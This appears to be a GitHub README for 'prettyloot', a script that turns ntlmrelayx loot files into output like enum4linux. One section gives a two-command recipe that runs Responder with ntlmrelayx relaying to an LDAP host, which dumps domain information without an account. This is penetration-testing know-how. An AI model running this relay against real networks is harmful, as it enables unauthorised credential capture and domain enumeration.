# prettyloot

Convert the loot directory of ntlmrelayx into an enum4linux like output after you dump the domain info using LDAP !

![image](https://user-images.githubusercontent.com/5891788/73091230-4afb5780-3eda-11ea-913d-20f0f0f0a561.png)

### Dumping domain info using ntlmrelayx without an account

```
# screen 1 => ntlmrelayx.py -t ldap://172.16.60.205 --no-da --no-acl -l /tmp/loot
# screen 2 => responder -I eth0
```

![image](https://user-images.githubusercontent.com/5891788/73091683-3e2b3380-3edb-11ea-84d7-fefb1f605d52.png)

Credits to [@ditrizna](https://twitter.com/ditrizna/status/1103964505510416384)

### Usage

```
python3 ntlmrelayx-prettyloot.py /tmp/loot
```

